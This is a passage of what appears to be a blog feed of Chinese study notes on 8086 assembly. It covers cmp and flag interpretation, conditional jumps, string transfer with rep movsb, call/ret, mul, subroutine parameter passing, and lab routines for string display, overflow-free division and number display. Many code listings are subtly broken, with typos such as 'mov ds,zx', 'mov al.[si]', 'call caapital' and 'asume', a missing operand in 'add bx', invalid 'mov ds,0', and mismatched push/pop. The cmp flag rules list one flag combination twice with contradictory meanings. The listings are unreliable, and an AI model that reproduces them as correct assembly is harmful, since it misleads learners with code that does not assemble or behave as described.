操作对象1，操作对象2</li><li>功能：操作对象1=操作对象1-操作对象2-CF</li><li>例：sbb ax，bx—&gt;(ax)=(ax)-(bx)-CF</li></ul><h1>cmp指令</h1><ul><li><p>比较指令，功能相当于减法指令，只是不保存结果</p></li><li><p>cmp指令执行后，将对标志寄存器产生影响</p></li><li><p>其他相关指令通过识别这些被影响的标志寄存器位来得知比较结果</p></li><li><p>格式：cmp 操作对象1，操作对象2</p></li><li><p>功能：计算“操作对象1-操作对象2”但不保存结果，仅仅根据计算结果对标志寄存器进行设置</p></li><li><p>例：cmp ax，ax—&gt;(ax)-(ax)结果为0，但并不保存在ax中，仅影响flag的相关各位</p><p>执行后：ZF=1,PF=1,SF=0,CF=0,OF=0</p></li><li><p>(爆破、破解)</p></li><li><p>比较：cmp ah，bh</p><ul><li><p>SF=1，OF=0</p><p>OF=0，说明没有溢出，逻辑上真正结果的正负=实际结果的正负</p><p>SF=1，实际结果为负，所以逻辑上真正的结果为负，所以（ah）&lt;（bh）</p></li><li><p>SF=1，OF=1</p><p>OF=1，说明有溢出，逻辑上真正结果的正负≠实际结果的正负</p><p>如果因为溢出而导致了实际结果为负，那么逻辑上真正的结果必然为正，这样，”SF=1，OF=1“说明了（ah）&gt;（bh）</p></li><li><p>SF=0，OF=1</p><p>（ah）&lt;（bh）</p></li><li><p>SF=0，OF=1</p><p>（ah）&gt;=（bh）</p></li></ul></li></ul><h1>检测比较结果的条件转移指令</h1><table><thead><tr><th>指令</th><th>含义</th><th>检测的相关标志位</th></tr></thead><tbody><tr><td>je</td><td>等于则转移</td><td>ZF=1</td></tr><tr><td>jne</td><td>不等于则转移</td><td>ZF=0</td></tr><tr><td>jb</td><td>低于则转移</td><td>CF=1</td></tr><tr><td>jnb</td><td>不低于则转移</td><td>CF=0</td></tr><tr><td>ja</td><td>高于则转移</td><td>CF=0,ZF=0</td></tr><tr><td>jna</td><td>不高于则转移</td><td>CF=1或ZF=1</td></tr></tbody></table><p>e：equal、ne：not equal、b：below、a：above</p><ul><li><p>都是cmp指令进行无符号数比较时，记录比较结果的标记位</p><p>比如je，检测ZF位，当ZF=1时进行转移，如果je前面使用了cmp指令，那么je对ZF的检测，实际上就是间接地检测cmp的比较结果是否为两数相等</p></li><li><p>编程实现：如果（ah）=（bh），则（ah）=（ah）+（ah），否则（ah）=（ah）+（bh）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp ah,bh<br>je s<br>add ah,bh<br>jmp short ok<br><br>s:add ah,ah<br>ok:ret<br></code></pre></td></tr></table></figure><ul><li>虽然je的逻辑含义是”相等则转移“，但它进行的操作是ZF=1时转移</li><li>”相等则转移“这种逻辑含义，是通过cmp指令配合使用来体现的，因为cmp指令为”ZF=1“赋予了”两数相等“的含义</li><li>je检测的是ZF位置，兵部观je前面是什么指令，只要CPU执行je指令时，ZF=1，那么就会发生转移</li></ul></li></ul><h1>DF标志</h1><ul><li>flag的第10位是DF，方向标志位</li><li>在串处理指令中，控制每次操作后si、di的增减<ul><li>DF=0：每次操作后，si、di递增</li><li>DF=1：每次操作后，si、di递减</li></ul></li></ul><h1>串传送指令</h1><ul><li><p>格式1：movsb</p><ul><li><p>功能：（以字节为单位传送）</p><ul><li><p>（（es） * 16+（di））=（（ds） * 16+（（si））</p></li><li><p>如果DF=0，则：（si）=（si）+1、（di）=（di）+1</p><p>如果DF=1，ze：（si）=（si）-1，（di）=（di）-1</p></li></ul></li><li><p>将ds：si指向的内存单元中的字节送入es：di中，然后根据标志寄存器DF位的值，将si和di递增或递减</p></li></ul></li><li><p>格式2：movsw</p><ul><li>以字为单位传送</li><li>将ds：si指向的内存单元中word送入es：di中，然后根据标志寄存器DF位的值，将si和di递增2或递减2</li></ul></li><li><p>一般movsb、movsw和rep配合使用</p><ul><li>格式：rep movsb</li><li>rep的作用是根据cx的值，重复执行后面的串传送指令</li><li>由于每执行一次movsb指令si和di都会递增或递减指向后一个单元或前个单元，则movsb就可以循环实现（cx）个字符的传送</li><li>由于flag的DF位决定着传送指令执行后，si和di改变的方向，所以CPU应该提供相应的指令来对DF位进行设置，从而使程序员能够决定传送的方向</li><li>8086CPU提供两条指令对DF位进行设置：<ul><li>cld指令：将标志寄存器的DF位置0</li><li>std指令：将标志寄存器的DF位置1</li></ul></li></ul></li><li><p>编程</p><p>1、用串传送指令，将打他段中的第一个字符串复制到它后面的空间中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; 传送的原始位置：data:0<br>; 传送的目的位置：data:16<br>; 传送的长度：16<br>; 传送的方向：因为正向传送（每次串传送指令执行后，si和di递增）比较方便，所以设置DF=0<br><br>data segment<br> db &#x27;welcom to masm!&#x27;<br> db 16 dup (0)<br>data ends<br><br>code  segment<br>start: mov ax,data<br>   mov ds,zx<br>   mov si,0     ;ds:si指向打他：0<br>   mov es,ax<br>   mov di,16    ;es:di指向data:16<br>   mov cx,16    ;(cx)=16,rep循环16次<br>   <br>   cld          ;设置DF=0，正向传送<br>   rep movsb<br>   <br>   mov ax,4c00h<br>   int 21h<br>   <br>code ends<br>end start<br></code></pre></td></tr></table></figure><ul><li><p>分析：</p><p>使用串传送指令进行数据的传送，需要给它提供一些必要的信息：</p><ul><li>传送的原始位置：ds:si</li><li>传送的目的位置：es:di</li><li>传送的长度：cx</li><li>传送的方向：DF</li></ul></li></ul><p>2、用串传送指令，将F000H段中最后16个字符复制到data段中</p><ul><li>要传送的字符串位于F000H段的最后16个单元中，那么它的最后一个字符的位置：F000：FFFF是显而易见的</li><li>可以将ds：si指向F000H段的最后一个单元，将es：di指向data段中的最后一个单元，然后逆向（即从高地址向低地址）传送16个字节</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; 传送的原始位置：F000:FFFF<br>; 传送的目的位置：data:15<br>; 传送的长度：16<br>; 传送的方向：因为逆向传送（每次串传送指令执行后，si和di递减）比较方便，所以设置DF=1<br>data segment<br>db 16 dup (0)<br>data ends<br><br>code segment<br>start: mov ax,0f000h<br>   mov ds,ax<br>   mov ax,data<br>   mov es,ax<br>   mov di,15<br>   mov cx,16<br>   <br>   std<br>   rep movsb<br>   <br>   mov ax,4c00h<br>   int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure></li></ul><h1>pushf、popf</h1><p>pushf：将标志寄存器的值压栈</p><p>popf：从栈中弹出数据，送入标志寄存器中</p><p>pushf和popf位直接范文标志寄存器提供了一种方法</p>]]></content>
    
    
    <categories>
      
      <category>汇编基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>10-call和ret指令</title>
    <link href="/2022/02/16/10call%E5%92%8Cret%E6%8C%87%E4%BB%A4/"/>
    <url>/2022/02/16/10call%E5%92%8Cret%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1>ret和retf</h1><h5 id="ret">ret</h5><ul><li>ret指令用栈中的数据，修改IP的内容，从而实现近转移</li><li>CPU执行ret指令时，进行两步操作：<ul><li>（IP）=（（ss）*16+（sp））—&gt;指向栈顶</li><li>（sp）=（sp）+2</li></ul></li><li>相当于pop IP</li></ul><h5 id="retf">retf</h5><ul><li><p>retf指令用栈中的数据，修改cs和ip的内容，从而实现远转移</p></li><li><p>执行时：</p><ul><li>（IP）=（（ss）*16+（sp））</li><li>（sp）=（sp）+2</li><li>（cs）=（（ss）*16+（sp））</li><li>（sp）=（sp）+2</li></ul></li><li><p>相当于pop IP、pop CS</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br><br>stack segment<br> db 16 dup (0)<br>stack ends<br><br>codesg segment<br>mov ax,4c00h<br>int 21h<br>start:<br>mov ax,stack<br>mov ss,ax<br>mov sp,16<br>mov ax,0<br><br>push ax<br><br>mov bx,0<br>ret   ;相当于pop IP---&gt;在这段程序中，最后使得IP=0，回到最开始<br>codesg ends<br><br>end start<br></code></pre></td></tr></table></figure><h1>call指令</h1><ul><li><p>call指令经常跟ret指令配合使用，因此CPU执行call指令，进行两步操作</p><ul><li>将当前的IP或CS和IP压入栈中</li><li>转移（jmp）</li></ul></li><li><p>call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同</p></li><li><p>call 标号</p><ul><li><p>将当前的IP压栈后，转到标号处执行指令</p></li><li><p>CPU执行此种格式的call指令时，进行以下操作：</p><ul><li><p>（sp）=（sp）-2</p><p>（（ss）*16+（sp））=（IP）</p></li><li><p>（IP）=（IP）+16位位移</p></li></ul></li><li><p>16位位移=“标号”处的地址-call指令后的第一个字节的地址</p></li><li><p>16位位移的范围为-32768~32767，用补码表示</p></li><li><p>16位位移由编译程序在编译时算出</p></li></ul></li></ul><h1>转移的目的地址在指令中的call指令</h1><p><strong>call far ptr 标号</strong></p><ul><li><p>实现段间转移</p></li><li><p>CPU执行时的操作</p><ul><li><p>（sp）=（sp）-2</p><p>（（ss）*16+（sp））=（CS）</p><p>（sp）=（sp）-2</p><p>（（ss）*16+（sp））=（IP）</p></li><li><p>（CS）=标号所在的段地址</p><p>（IP）=标号所在的偏移地址</p></li></ul></li><li><p>相当于进行：</p><p>push CS</p><p>push IP</p><p>jmp far ptr 标号</p></li></ul><h1>转移地址在寄存器中的call指令</h1><ul><li><p>格式：call  16位寄存器</p></li><li><p>功能：</p><ul><li>（sp）=（sp）-2</li><li>（（ss）*16+（sp））=（IP）</li><li>（IP）=（16位寄存器）</li></ul></li><li><p>相当于</p><p>push IP</p><p>jmp 16位寄存器</p></li></ul><h1>转移地址在内存中的call指令</h1><ul><li><p>call word ptr 内存单元地址</p><ul><li><p>push IP</p></li><li><p>jmp word ptr 内存单元地址</p></li></ul></li><li><p>call dword ptr 内存单元地址</p><ul><li>push CS</li><li>push IP</li><li>jmp dword ptr 内存单元地址</li><li>（底16位放IP，高16位放CS）</li></ul></li></ul><h1>call和ret的配合使用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>start: mov ax,1<br>   mov cx,3<br>   call s  ;将紧接着的一条指令的IP地址推入栈中，然后跳到s中执行<br>   mov bx,ax<br>   mov ax,4c00h<br>   int 21h<br> s:add ax,ax<br>   loop s   ;loop想到cs，cs为0时退出循环<br>   ret  ;pop IP,回到mov bx,ax<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h1>mul指令</h1><ul><li><p>乘法指令</p></li><li><p>相乘的两个数，要么都是8位，要么都是16位</p><ul><li><p>8位：AL中和8位寄存器或内存字节单元中（乘数默认在al中）</p><p>​          结果保存在AX中</p><p>mul byte ptr ds:[0]：(ax)=(al) * ((ds) * 16+0)</p></li><li><p>16位：AX中和16位寄存器或内存字单元中</p><p>​            结果保存在DX（高位）和AX（低位）中</p><p>mul word ptr [bx+si+8]：(ax)=(ax) * ((ds) * 16+(bx)+(si)+8)结果的底16位</p><p>​ (dx)=(ax) * ((ds) * 16+(bx)+(si)+8)结果的高16位</p></li></ul></li><li><p>格式：</p><p>mul reg</p><p>mul 内存单元</p></li></ul><h1>参数和结果传递的问题</h1><p>设计一个子程序，可以根据提供的N，来计算N的3次方</p><ul><li>用寄存器来存储参数和结果是最常使用的方法</li><li>对于存放参数的寄存器和存放结果的寄存器，调用者和子程序的读写操作qqxf：<ul><li>调用者将参数送入参数寄存器，从结果寄存器中取到返回值</li><li>子程序从参数寄存器中取到参数，将返回值送到结果寄存器</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br><br>data segment<br>dw 1,2,3,4,5,6,7,8<br>dd 0,0,0,0,0,0,0,0<br>data ends<br><br>code segment<br><br>start:mov ax,data<br>  mov ds,ax<br>  mov si,0    ;ds:si指向第一组word单元<br>  mov di 16   ;ds:di指向第二组dword单元<br>  <br>  mov cx,8<br>s:mov bx,[si]<br>  call cube<br>  mov [di],ax<br>  mov [di].2,dx<br>  add si,2    ;ds:si指向下一个word单元<br>  add di,4    ;ds:di指向下一个dword单元<br>  loop s<br>  <br>  mov ax,4c00h<br>  int 21h<br></code></pre></td></tr></table></figure><h1>批量数据的传递</h1><ul><li><p>将批量的数据放到内存中，然后将它们所在内存空间的首地址放在寄存器中，传递给需要的子程序</p></li><li><p>将打他段中的字符串转化为大写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>data segment<br>db &#x27;conversation&#x27;<br>data ends<br><br>code segment<br>start:mov ax,data<br>  mov ds,ax<br>  mov si,0    ;ds:si指向字符串（批量数据）所在空间的首地址<br>  <br>  mov cx,12   ;cx存放字符串的长度<br>  call capital<br>  <br>  mov ax,4c00h<br>  int 21h<br>  <br>capital:and byte [si],11011111b<br>inc si<br>loop capital<br>ret<br><br>  <br>code ends<br>end start<br></code></pre></td></tr></table></figure></li></ul><h1>寄存器冲突的问题</h1><ul><li>设计一个子程序，将一个全是字母，以0结尾的字符串，转化为大写</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">capital:mov al.[si]<br>mov ch,0<br><br>jcxz ok   ;如果（cx）=0，结束，如果不是0，处理<br><br>and byte ptr [si],11011111b  ;将ds：si所指单元中的字母转化为大写<br><br>inc si    ;ds:si指向下一个单元<br><br>jmp short capital<br><br>  ok:ret<br></code></pre></td></tr></table></figure><ul><li><p>将data段中字符串全部转化为大写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;?<br>assume cs:code<br>data segment<br>db &#x27;word&#x27;,0<br>db &#x27;unix&#x27;,0<br>db &#x27;wind&#x27;,0<br>db &#x27;good&#x27;,0<br>data ends<br><br>code segment<br>start:mov ax,data<br>  mov ds,ax<br>  mov bx,0<br>  <br>  mov cx,4<br>  <br>s:mov si,bx<br>  call caapital<br>  add bx<br>  loop s<br>  <br>  mov ax,4c00h<br>  int 21h<br>  <br>capital:mov al.[si]<br>mov ch,0<br><br>jcxz ok   ;如果（cx）=0，结束，如果不是0，处理<br><br>and byte ptr [si],11011111b  ;将ds：si所指单元中的字母转化为大写<br><br>inc si    ;ds:si指向下一个单元<br><br>jmp short capital<br><br>  ok:ret<br>  <br>code ends<br>end start<br></code></pre></td></tr></table></figure><h1>实验</h1><h5 id="显示字符串">显示字符串</h5><p>功能：在指定的位置用指定的颜色显示一个用</p><p>参数：（dh）=行号（取值范围0~24），（dl）=列号（取值范围为0 ~ 79），（cl）=颜色，ds:si指向字符串的首地址</p><p>例：在屏幕的8行3列，用绿色显示data段中字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>data segment<br>db &#x27;welcome to masm!&#x27;,0<br>data ends<br><br>code segment<br>start:mov dh,8<br>  mov dl,3<br>  mov cl,2<br>  mov ds,ax<br>  mov si,0    ;偏移地址为0，指向第一个字符<br>  <br>  call show_str<br>  <br>  mov ax,4c00h<br>  int 21h<br>  <br>  <br>show_start:<br>mov dh,8   ;dh装行号（范围：1~25）<br>mov dl,3   ;dl装列号（范围：1~80，每超过80等于行号自动+1）<br>mov cl,2   ;cl中存放颜色属性（0cah为红底高亮闪烁绿色属性）<br><br>mov ax,data<br><br>mov ds,ax<br><br>mov si,0<br><br>call show_str<br><br>mov ax,4c00h<br><br>int 21h<br><br>show_str:   ;显示字符串的子程序<br>push cx<br>push si<br><br>mov al,0A0h<br><br>dec dh   ;行号在显存中下标从0开始，所以-1<br>mul dh   ;相当于从第（n-1）*0A0h个byte单元开始<br><br>mov bx,ax   ;定位好的位置偏移地址存放在bx里（行）<br><br>mov al,2    ;每个字符占2个字节<br>mul dl      ;定位列，结果ax存放在的是定位好的列的位置<br>sub ax,2    ;列号在显存中下标从0开始，又因为偶字节存放字符，所以-2<br><br>add bx,ax   ;此时bx中存放的是行与列号的偏移地址<br><br>mov ax,0B800h  ;显存开始的地址<br>mov es,ax      ;es中存放的是显存的第0页（0-7页）的起始的段地址<br><br>mov di,0       ;di指向显存的偏移地址,确定指向下一个要处理的字符的位置<br><br>mov al,cl      ;cl是存放颜色的参数，这时候al存放颜色<br><br>mov ch,0       ;下边cx存放的是每次准备处理的字符串<br><br>s:mov cl,ds:[si]  ;ds:[si]指向“welcome to masm！”，0<br><br>jcxz ok        ;当cl的值为0的时候，cx==0，则发生跳转，到ok处结束处理<br><br>mov cs:[bx+di],cl  ;偶地址存放字符<br>mov cs:[bx+di+1],al  ;奇地址存到字符串的颜色属性<br><br>inc si<br><br>add di,2   ;指向下个字符串<br>jmp short s   ;无条件跳转，jcxz是离开的关键<br><br>ok:pop si<br>   pop cx <br>   <br>   ret  ;显示字符串的子程序[定义结束]<br><br>code ends<br>end start<br></code></pre></td></tr></table></figure></li></ul><h5 id="divdw-解决除法溢出问题">divdw(解决除法溢出问题)</h5><p>功能：进行不会产生溢出的除法运算，被除数为dword型，除数为word型，结果为dword型</p><p>参数：（ax）=dword型数据的低16位</p><p>​（ds）=dword型数据的高16位</p><p>​    （cx）=除数</p><p>返回：（dx）=结果的高16位，（ax）=结果的低16位</p><p>​（cx）=余数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br><br>code segment<br><br>start:<br>mov ax,stack<br><br>mov ss,ax<br><br>mov sp,10h<br><br>mov ax,4240h<br><br>mov dx,0fh<br><br>mov cx,0ah<br><br>call divdw<br><br>mov ax,4c00h<br>int 21h<br><br>divdw:<br>push ax        ;低16位先保存<br><br>mov ax,dx      ;这时ax的值是高16位了<br><br>mov dx,0       ;dx置0是为了不影响下边余数位<br><br>div cx         ;H/H<br><br>mov bx,ax      ;ax,bx的值为（int）H/H，dx的值为（rem）H/H<br><br>pop ax         ;ax的值现在是L<br><br>div cx         ;L/M,注意16位除法的时候默认被除数dx为高16位，ax为低16位<br><br>mov cx,dx<br><br>mov dx,bx<br><br>ret <br><br>code ends<br>end start<br><br><br><br></code></pre></td></tr></table></figure><h5 id="数值显示">数值显示</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs assembly">asume cs:code,ds:data<br><br>data segment<br>db 10 dup (0)<br>data ends<br><br>code segment<br><br>start:<br>mov ax,12666<br><br>mov bx,data    ;ds:si指向字符串的首地址<br>mov ds,bx<br>mov si,0<br><br>call dtcc       ;dtcc子程序实现将word型整数转化为字符串并存储<br><br>mov dh,s        ;初始化打印的位置<br>mov dl,3<br>mov cl,0cah<br><br>call show_str    ;开始打印字符串<br><br>mov ax,4c00h<br>int 21h<br><br>dtcc:   ;数值显示的子程序定义<br>push ds<br>push cx<br>push ax<br>push si<br>push bx<br><br>mov bx,0   ;bx在子程序中用来存放位数，用栈来临时存放修改后的字符<br><br>s1:mov cx,100  ;d表示十进制<br>        mov ds,0<br><br>        div cx      ;除以10<br>        mov cx,ax   ;得到的商赋值给cx<br>        <br>        jcxz s2     ;当商为0则跳到s2<br>        <br>        add dx,30h<br>        push dx<br>        <br>        inc bx<br>        <br>        jmp short s1<br>        <br>s2:add dx,30h<br>push dx     ;当商为0是，余数为个位<br><br>inc bx      ;再进行一次栈操作（补充当“商为零而余数不为零”时的情况<br><br>mov cx,bx   ;总共有bx位进栈了，所以循环次数位bx<br>mov si,0<br><br>s3:pop ax      ;s3实现将栈中的数据依次出栈放到指定的内存中<br><br>mov [si],al<br>inc si<br><br>loop s3<br><br>okay:pop bx<br>pop si<br>pop ax<br>pop cx<br>pop dx<br><br>ret   <br><br>code ends<br>end start<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>汇编基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>9-转移指令的原理</title>
    <link href="/2022/02/16/9%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/"/>
    <url>/2022/02/16/9%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/</url>
    
